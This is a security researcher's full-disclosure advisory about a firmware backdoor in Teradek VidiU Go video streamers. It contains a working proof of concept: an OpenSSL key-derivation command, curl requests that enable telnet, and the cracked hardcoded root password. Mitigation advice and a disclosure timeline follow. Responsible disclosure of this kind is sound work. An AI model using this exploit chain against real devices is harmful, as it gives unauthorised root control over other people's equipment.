# :globe_with_meridians: Full disclosure: 0-day RCE backdoor in Teradek IP video device firmwares

---

# Full disclosure: 0-day RCE backdoor in Teradek IP video device firmwares

## This is a report of a 0-day backdoor giving remote root shell access on Teradek IP video devices. Reported the issue to the manufacturer last year, they have released a new firmware version since then, but have not fixed it. That is why this is full disclosure here. Proof of concept is following below.

## About the device

The [Teradek](https://teradek.com/) IP video devices are live streaming devices able to encode video inputs (like SDI, HDMI, etc) to various streaming formats capable of Ethernet transport. There are different IP video devices made by Teradek, but the firmwares seems to be very similar (especially in the backdoor functionality). We have analyzed a [Teradek VidiU Go](https://teradek.com/collections/vidiu-go-family) model.

*Teradek VidiU Go IP video streaming device*

The device has an Ethernet interface and there is a Web management interface accessible at http://<device_ip> by default. The Web management interface is protected by a user-defined password.

*Login prompt for the user-defined password on Teradek VidiU Go*

## Reversing the firmware

[Firmware images for download](https://teradek.com/pages/downloads) are available at the manufacturer site. The images are unencrypted, unprotected Squashfs files, can be unpacked easily using [squashfs-tools](https://github.com/plougher/squashfs-tools).

The [firmware](https://teradek.com/pages/downloads#vidiu-go) for the VidiU Go device is built on ARM64 Linux kernel. We have analyzed the version 3.1.12 (in 2020), but the latest 3.1.13 is exactly the same in the aspect of this report.

Webroot for the built-in lighttpd webserver is /home/www. The folder /home/www/cgi-bin contains .cgi binary files, and there are also important dependencies (as .so libraries) in the /usr/lib folder.

There are a lot of interesting functions to analyze and probably it is possible to find more vulnerabilities, but let’s focus on the backdoor access function found in /home/www/cgi-bin/test.cgi.

*Reversing test.cgi by Ghidra*

After a short basic reverse engineering process on the main() function of test.cgi with the help of the awesome [Ghidra](https://ghidra-sre.org/) tool, it is easy to see that

- `http://<ip_of_the_device>/cgi-bin/test.cgi` is accessible without authentication

- with GET parameter `command=remote-access test.cgi` calls `/usr/share/system/remote-access.sh` with parameters start/stop depending on another GET parameter enable=0/1

- the script `/usr/share/system/remote-access.sh` starts/stops telnetd giving telnet access to anyone with network access to the 23/tcp port on the device.

- in order to use `command=remote-access`, a suitable key parameter should be supplied what is compared with `td_license_create(“tdtest”, 0, 0)`.

## Reversing the key calculation

The td_license_create() function is implemented in the libtd.so library.

*Reversing the crypto key generation*

Reversing the crypto functions shows that the key calculation is the following:

```
td_license_create(“tdtest”, 0, 0) = SHA1(SHA512(“0x5f3759df<MAC_ADDRESS_OF_DEVICE>tdtest”))
```

This means everything required for the key calculation is hardcoded in the generic firmware, and only the MAC address part is device-dependent. Because the MAC address is easy to know for someone on the same LAN, the key for opening the telnet interface can be calculated.

## Enabling the Telnet interface

So the required key can be calculated using the following Linux command with OpenSSL (with the example MAC address DE:AD:BE:EF:00:00):

```
echo -n 0x5f3759dfDE:AD:BE:EF:00:00tdtest | openssl dgst -sha512 -binary — | openssl dgst -sha1 — | cut -d’ ‘ -f2
```

The result is: `2f1a4cf8d815c99f70268c0873c9dffb13015052`.

## Get István Tóth’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Now the telnet interface can be enabled with the following GET request (let’s assume the device IP is 192.168.0.10):

```
curl 'http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&command=remote-access&enable=1'
```

The HTTP response is 500 (404 if the key is wrong), but the telnet interface gets enabled.

For disabling, just use `enable=0`:

```
curl 'http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&command=remote-access&enable=0'
```

## Root credentials

Now the Telnet is enabled, connecting gives a login prompt. For credentials, look up `/etc/shadow` in the firmware image:

```
root:HjMedVB3oPf0o:11851:0:99999:7:::
```

Nice, it is a traditional weak Unix crypt() DES hash, 100% crackable in a very short (~3 days) time frame. In addition, after cracking, the password proved to be very weak, but it did not matter, we would have cracked it anyway.

The cracked credentials for root access:

```
root:upsetdac
```

Game over. Anyone with (local) network access can enumerate the MAC address, can calculate the key (using the hardcoded values) required for enabling the telnet, can enable the telnet interface (without supplying any additional credentials, no matter what was the user-defined password), and can login remotely as root (using the hardcoded static root password) and own the device.

## Proof of concept summary

- Enumerate the MAC address (`DE:AD:BE:EF:00:00`)

- Calculate the key: `echo -n 0x5f3759dfDE:AD:BE:EF:00:00tdtest | openssl dgst -sha512 -binary — | openssl dgst -sha1 — | cut -d’ ‘ -f2` (the result is `2f1a4cf8d815c99f70268c0873c9dffb13015052`)

- Enable telnet: `curl ‘http://192.168.0.10/cgi-bin/test.cgi?key=2f1a4cf8d815c99f70268c0873c9dffb13015052&command=remote-access&enable=1'`

- Login: `telnet 192.168.0.10` with user `root` and password `upsetdac`.

*PoC for enable telnet + root login on Teradek VidiU Go*

*PoC for disabling the telnet interface on Teradek VidiU Go*

## Affected firmwares

- Teradek VidiU Go 3.1.12 (released on 08–06-2020)

- Teradek VidiU Go 3.1.13 (released on 05–10–2021, latest at the time of writing)

- and probably other Teradek firmwares for other devices (saw the same code with the same hardcoded hashes in other firmwares, but testing is required).

## Mitigation

There is no fix, the manufacturer should be aware of this backdoor, but apparently not interested in it, not going to patch it. So the solution is only mitigation.

Because there is no way to disable the backdoor and/or change hardcoded keys/passwords, the only mitigation is adding another (network/reverse proxy) layer of protection to the web interface (in addition to the user-defined password): restrict access to the web interface (or preferably to the device) only from trusted networks/users.

E.g. put it behind NAT/Firewall and give access to the device with credentials using some secure services like SSH tunnel or reverse proxy with authentication only for trusted users.

## Timeline

12–01–2020: contacted Teradek, starting a responsible disclosure process
12–11–2020: contacted Teradek again, because there was no reply
12–14–2020: Teradek asked for details
12–15–2020: shared some details
12–15–2020: Teradek asked for more details
12–15–2020: shared some more details
01–04–2021: contacted Teradek again, because they have not replied
05–10–2021: new firmware release (v3.1.13 for the device, but no fix)
09–03–2021: still no reply from Teradek, decided to do a full disclosure

## UPDATE

Within 24 hours of publishing this full disclosure report, Teradek replied (on Twitter, here, in the thread: [https://twitter.com/an0n_r0/status/1433591276369219585](https://twitter.com/an0n_r0/status/1433591276369219585)) and promised a fix in 2 weeks. That’s awesome, thank you! :)

---
